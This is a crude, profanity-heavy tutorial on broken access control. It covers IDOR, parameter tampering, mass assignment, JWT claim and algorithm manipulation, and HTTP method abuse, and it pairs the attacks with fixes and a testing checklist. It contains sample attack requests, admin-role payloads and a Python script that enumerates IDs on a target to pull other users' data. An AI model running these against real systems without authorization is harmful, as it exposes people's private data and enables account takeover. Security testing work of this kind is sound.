
## **BROKEN ACCESS CONTROL - THE COMPLETE FUCKING MASTERCLASS**

### **What This Shit Really Means:**
Broken Access Control means the application fails to enforce **"who can do what to whom"**. It's like having a security system that looks tough but has all the doors unlocked.

### **The Core Fucking Concepts:**

#### **1. Horizontal vs Vertical Privilege Escalation**

**Horizontal:** You stay at your level but access other people's shit
- Example: User A can see User B's data (same privilege level)
- `https://bank.com/account/123` → `https://bank.com/account/124` 😈

**Vertical:** You climb the fucking ladder to higher privileges  
- Example: Regular user becomes admin
- Changing `role=user` to `role=admin` in your profile

#### **2. IDOR (Insecure Direct Object References) - The Hacker's Best Friend**

This is where the real fun begins, IDOR happens when the app exposes internal implementation objects to users.

**Real-World Hunting Grounds:**
- URLs with IDs: `/user/567/profile`
- API endpoints: `/api/orders/8912`
- File downloads: `/download?file=secret.docx`
- API parameters: `{"user_id": 734}`

### **Advanced Exploitation Techniques:**

#### **Method 1: Parameter Tampering - The Classic Fuckery**

**Scenario:** E-commerce site where you can view orders

```http
GET /api/orders/1001 HTTP/1.1
Authorization: Bearer user_jwt_token
```

**What a hacker does:**
```http
GET /api/orders/1002 HTTP/1.1  # Changed from 1001 to 1002
Authorization: Bearer user_jwt_token
```

**Even more dangerous:**
```http
GET /api/admin/users HTTP/1.1  # Trying admin endpoint
Authorization: Bearer user_jwt_token  # With regular user token
```

#### **Method 2: Mass Assignment Attacks - The Silent Killer**

**Vulnerable Registration Code:**
```javascript
// Shitty code that blindly accepts all fields
app.post('/register', (req, res) => {
    const user = new User(req.body);
    user.save();
});

// Request payload a normal user would send:
{
    "username": "john",
    "email": "john@email.com",
    "password": "123456"
}

// What a hacker sends:
{
    "username": "hacker",
    "email": "hacker@evil.com", 
    "password": "hackpass",
    "role": "admin",           // Adding unauthorized field
    "isActive": true
}
```

**The Fix - Explicitly allow fields:**
```javascript
app.post('/register', (req, res) => {
    const { username, email, password } = req.body;
    const user = new User({ username, email, password });
    user.save();
});
```

#### **Method 3: JWT Token Fuckery**

**Decoding a JWT (JSON Web Token):**
```javascript
// A JWT looks like: header.payload.signature
// Decode the payload (it's base64):
const payload = {
    "user_id": 123,
    "username": "regular_user",
    "role": "user",        // Target for modification
    "exp": 1635724800
}
```

**Attack Vectors:**
1. **Algorithm Switching:** Change `alg: "RS256"` to `alg: "none"`
2. **Signature Bypass:** Remove/alter the signature
3. **Claim Manipulation:** Decode and change `role: "user"` → `role: "admin"`

#### **Method 4: HTTP Method Manipulation**

Sometimes the frontend hides buttons but the backend endpoints still exist:

```http
# Frontend doesn't show delete button for users
# But the endpoint might still be accessible:

POST /api/users/delete/567 HTTP/1.1
# OR try different methods:
PUT /api/users/567 HTTP/1.1
PATCH /api/users/567 HTTP/1.1  
DELETE /api/users/567 HTTP/1.1
```

### **The Unstoppable Hacker's Toolkit:**

#### **Manual Testing Approach:**
1. **Spider the application** - find all endpoints
2. **Map user roles** - what can each role do?
3. **Test every fucking endpoint** with different privilege levels
4. **Parameter fuzzing** - try sequential IDs, UUIDs, other users' data

#### **Burp Suite Magic:**
```
# Using Burp Scanner + Manual testing
1. Configure different user contexts in Burp
2. Compare site maps between user roles
3. Use "Compare Site Maps" to find hidden endpoints
4. Automate parameter tampering with Intruder
```

#### **Automated Script Example:**
```python
import requests
import json

# Your authenticated session
session = requests.Session()
session.headers.update({'Authorization': 'Bearer YOUR_TOKEN'})

# Test IDOR across multiple endpoints
endpoints = [
    '/api/users/{}',
    '/api/orders/{}', 
    '/api/files/{}',
    '/api/admin/users/{}'
]

def test_idor(user_id_range):
    for endpoint in endpoints:
        for user_id in user_id_range:
            url = f"https://target.com{endpoint.format(user_id)}"
            response = session.get(url)
            
            if response.status_code == 200:
                print(f"[!] VULNERABLE: {url}")
                # Check if we got someone else's data
                data = response.json()
                if 'email' in data or 'private' in str(data).lower():
                    print(f"[CRITICAL] Got sensitive data from {url}")
```

### **Real-World Exploitation Chain:**

**Step 1:** Find user ID in profile: `GET /api/me` → `{"id": 1001, "role": "user"}`

**Step 2:** Test horizontal escalation:
```http
GET /api/users/1002
GET /api/users/1001/orders
GET /api/users/1002/orders  # Bingo! We see other user's orders
```

**Step 3:** Test vertical escalation:
```http
GET /api/admin/dashboard
GET /api/admin/users
POST /api/admin/create-user
```

**Step 4:** Mass assignment on user update:
```http
PATCH /api/users/1001
Content-Type: application/json

{"username": "hacker", "role": "admin", "permissions": "all"}
```

### **Bypassing Weak Defenses:**

**Weak Check (Easily Bypassed):**
```python
# Easy to bypass - only checks if user exists
if request.user.is_authenticated:
    return sensitive_data  # FUCKING DANGEROUS
```

**Strong Check (Proper Authorization):**
```python
# Proper fucking authorization
def view_sensitive_data(request, data_id):
    user = request.user
    sensitive_data = SensitiveData.objects.get(id=data_id)
    
    # Check ownership or specific permissions
    if sensitive_data.owner != user and not user.has_perm('view_all_data'):
        raise PermissionDenied("Get the fuck out")
    
    return sensitive_data
```

### **The Ultimate Testing Checklist:**

- [ ] Test all object references in URLs and parameters
- [ ] Try accessing other users' resources by ID manipulation  
- [ ] Test mass assignment on all create/update endpoints
- [ ] Check JWT tokens for algorithm vulnerabilities
- [ ] Test HTTP methods beyond what the UI shows
- [ ] Attempt to access admin interfaces as regular user
- [ ] Test file downloads with manipulated paths
- [ ] Check for CORS misconfigurations that leak data
- [ ] Test race conditions in privilege changes

This is how you become fucking unstoppable. You systematically break every assumption the developers made about "who should see what". You treat every ID, every endpoint, every parameter as a potential gateway to someone else's kingdom.

